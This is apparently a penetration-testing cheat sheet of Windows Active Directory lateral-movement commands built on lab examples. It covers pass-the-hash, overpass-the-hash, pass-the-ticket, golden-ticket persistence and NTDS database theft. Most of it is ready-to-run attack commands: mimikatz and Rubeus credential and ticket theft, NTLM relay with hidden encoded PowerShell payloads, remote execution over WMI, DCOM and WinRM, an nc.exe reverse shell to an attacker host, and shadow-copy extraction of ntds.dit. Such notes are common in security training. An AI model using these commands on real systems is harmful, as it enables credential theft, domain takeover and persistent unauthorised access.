### ***Move using Hashes and Tickets! (LAr for ALL)***
# ***Pass the Hash (DU)***
***Works on Domain accounts and the BUILTIN-Administrator account (for Local Admin group) only!***
## impacket (smb)
```shell
# Domain / Local
impacket-psexec -dc-ip `dc` `dom`/user@`tip` -hashes :HASH
impacket-psexec Administrator@`tip` -hashes :HASH

# other EXECS
impacket-wmiexec
impacket-smbclient
impacket-smbexec
impacket-atexec
impacket-dcomexec
```
## nxc
```shell
nxc smb `tip` -d `dom` -u 'AdminUser' -H HASH -x "COMMAND" [ --local-auth ] [ --verbose ]
# Other Protocols
wmi
ldap
ssh
winrm
rdp
vnc
```
## NTLMv2 Relay
```shell
# 1 Setup in Kali
impacket-ntlmrelayx --no-http-server -smb2support -t RELAY_TO_IP -c "powershell.exe -nop -w hidden -enc encoded_payload..."

# 2 Force auth
dir \\KALI_IP\path\to\test
```
## nxc
```shell
nxc smb `tip` -d DOMAIN -u USER -H HASH -x "COMMAND"
# Can use --local-auth instead of -d
# -t [threads]
# --verbose
# Other Protocols
# ftp
# rdp
# mssql
# smb
# ldap
# ssh
# winrm
```
## evilwinrm
```shell
evil-winrm -i `tip` -u USER -H HASH
```
# ***Windows***
## WMI (rpc)
***runs as session 0***
```shell
# 1. Print payload
python3 ./encode.py

# 2
# cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e ..."

# PS CimSession
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$TARGET = 192.168.207.72
$session = New-Cimsession -ComputerName $TARGET -Credential $credential -SessionOption options
$Command = "powershell -nop -w hidden -e ..."
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
```
## WinRm (RMU)
```shell
# 1. Print payload
python3 ./encode.py


# 2
# winrs
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop ..."

# PS PsSession
$username = 'jen'; # known user
$password = 'Nexus123!'; # known password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$TARGET = 192.168.50.73
New-PSSession -ComputerName $TARGET -Credential $credential
Enter-PSSession 1
```
## psexec.exe (password,smb,printer)
```shell
.\PsExec.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
.\PsExec.exe -i \\192.168.50.80 -u offensive -p security ipconfig
.\PsExec.exe -i \\192.168.50.80 -u offensive -p security powershell

# https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```
## runas / start-process (GUI)
```shell
# cmd
runas /user:[DOMAIN\]Administrator "cmd.exe /c powershell"
# /c (non-interactive) /k (interactive)

# PS
Start-Process PowerShell -Verb RunAs
```
## start-process (Non GUI)
```shell
# Need to create a secured credential
$Username = "DOMAIN\Username"
$Password = "Password"
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

Start-Process -FilePath C:\path\to\program.exe -Credential $Credential
```
## RunasCs (Non Gui)
```shell
# Invode-RunasCs.ps1 #
powershell -ep bypass
. .\Invoke-RunasCs.ps1

# nc.exe reverse payload (try others if it doesnt work)
Invoke-RunasCs DOMAIN\user pass "C:\Users\Public\nc.exe KALI_IP LPORT -e powershell" --force-profile --logon-type 2

# RunasCs.exe #
RunasCs.exe user pass cmd ...
-d [domain]
-r [host]:[port] (reverse shell)
-b (bypasses UAC)

# https://github.com/antonioCoco/RunasCs/tree/master
```
## psremoting
```shell
# 1 In ADMIN powershell, add target to trustedhosts
Enable-PSRemoting
Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80

# 2 Run
# A Single command
Invoke-Command -ComputerName 192.168.50.80 -ScriptBlock { ipconfig } -Credential offensive

# B Session
Enter-PSSession -ComputerName 192.168.50.80 -Credential offensive
```
## Dcom
```shell
$TARGET = "192.168.50.73";
$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$TARGET));
# python3 encode.py and sub in to below
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -enc ...","7")
```
## mimikatz
```shell
privilege::debug
token::elevate
token::revert
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NT hash] /run:"[command]"
```

```shell
# resources
# https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
```
# ***Overpass the Hash (DU)***
***Use NTLM hash to get TGT so we can access services that use Kerberos***
## impacket
```shell
# 1 GET TGT using password or hash and save it
impacket-getTGT.py -dc-ip `dc` jurassic.park/velociraptorr -hashes :HASH
export KRB5CCNAME=./velociraptor.ccache

# 2 
impacket-psexec jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
## mimikatz
```shell
# 1 GET target user's hash
privilege::debug
token::elevate
sekurlsa::logonpasswords

# 2 USE pth to spawn PS in context of jen
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

# 3 FROM SPAWNED PS, obtain the TGT using a program that will use authentication
net user /domain
ls \\<DC>\sysvol

# 4 View the ticket (krbtgt server one is the TGT)
klist

# 5 Check success using a program such as PsExec
.\PsExece.exe \\files04 cmd


# b) Rubeus
.\Rubeus.exe asktgt /domain:[domain] /user:[user] /rc4:[hash] /ptt
```
# ***Pass-The-Ticket***
***Impersonate w/ TGS OR Pass TGT to obtain TGS***
## impacket
```shell
# CONVERT Ticket first if needed then export as below
export KRB5CCNAME=ticket.ccache
impacket-psexec jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
## mimikatz / rubeus
```shell
# a) mimikatz
#
# NO ACCESS as some Domain User initially (jen in this example)
ls \\web04\backup

# 1 OBATAIN dave's TGS (dave has a TGS for this service)
privilege::debug
token::elevate
sekurlsa::tickets /export

# 2 CHECK TGS and copy it
dir *.kirbi

# 3 INJECT the above TGS
kerberos::ptt ...-dave@cifs-web04.kirbi

# 4. CHECK we have TGS
klist

# TO ACCESS!
ls \\web04\backup


##########
# RUBEUS #
##########
.\Rubeus.exe ptt /ticket:[ticket]
```

# ***Persistence (DA)***
***Once DA, can use the following to persist***
## Golden ticket
```shell
# 1 OBTAIN krbtgt SID and NTLM hash
lsadump::lsa /patch

# 2 Clear existing tickets
kerberos::purge

# 3 Obtain TGT 
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

# 4 Open cmd
misc::cmd

#
# PsExec
PsExec.exe \\dc1 cmd.exe
```
## Shadow Copy (ntds)
```shell
# Powershell
# 1 CREATE the copy
vshadow.exe -nw -p  C:
#powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

# 2 Copy to C:\ 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# 3 Backup the SYSTEM hive
reg.exe save hklm\system c:\system.bak

# 4 Upload to KALI

# 5. KALI
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

# *resources*
```shell
# https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
```